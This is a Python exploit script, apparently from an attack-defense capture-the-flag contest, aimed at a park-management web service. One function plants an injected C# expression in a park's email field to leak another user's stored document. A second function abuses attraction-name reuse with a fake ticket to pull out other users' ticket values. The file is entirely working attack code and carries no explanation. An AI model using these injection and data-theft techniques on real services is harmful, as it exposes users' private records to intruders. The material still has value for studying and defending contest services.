import re
import sys

from client import Client
from data import get_random_creds, get_park_request, get_random_document
from models import RegisterRequest, AddAttractionRequest
from pretty_client import PrettyClient


def generate_email_payload(user_id):
    parts = ",".join([f"(char){ord(x)}" for x in user_id])
    guid_payload = f"Guid.Parse(new[]{{{parts}}})"
    return f"\"hacked-by-voidhack\"@userProvider.GetUser({guid_payload})"\


def get_host_port(hostname):
    parts = hostname.split(":", 2)
    return parts[0], int(parts[1] if len(parts) > 1 else 7777)


def first_sploit(hostname, user_id):
    host, port = get_host_port(hostname)
    native_client = Client(host, port)
    client = PrettyClient(native_client)

    login, password = get_random_creds()
    register_request = RegisterRequest(login=login, password=password, document=get_random_document())
    client.register_and_login(register_request)

    create_park_request = get_park_request(False)
    create_park_request.email = generate_email_payload(user_id)
    park_id = client.create_park(create_park_request)

    text = native_client.get_park(park_id).text
    res = re.findall(r"Document = (.*?),", text)
    return res[0] if len(res) > 0 else None


def second_sploit(hostname, park_id, attraction_id):
    host, port = get_host_port(hostname)
    client = PrettyClient(Client(host, port))

    login, password = get_random_creds()
    register_request = RegisterRequest(login=login, password=password, document=get_random_document())
    user_id = client.register_and_login(register_request)

    parks = client.get_last_parks()
    park = [x for x in parks.parks if x.id == park_id][0]
    attraction_name = [x for x in park.attractions if x.id == attraction_id][0].name

    created_park_id = client.create_park(get_park_request(False))
    add_attraction_request = AddAttractionRequest(name=attraction_name, description="1", cost=1, ticket="faked_ticket")
    (_, added_attraction) = client.add_attraction(created_park_id, add_attraction_request)

    user = client.buy_ticket(added_attraction.id, user_id)
    flags = [x for x in user.purchasesInfo.purchases if x.name == attraction_name and x.ticket != "faked_ticket"]
    return flags


def main():
    if len(sys.argv) < 2:
        print(f"usage: python {sys.argv[0]} localhost[:7777]")
        return

    hostname = sys.argv[1]
    print(first_sploit(hostname, "2868a3f5-6229-4b4b-b68c-65f6068132fb"))
    print(second_sploit(hostname, "493675f3-69ad-4fc6-bef4-9c1bed3a6ae3", "63f6ea4e-67fb-4406-860f-05b19b55420a"))
    pass


if __name__ == "__main__":
    main()
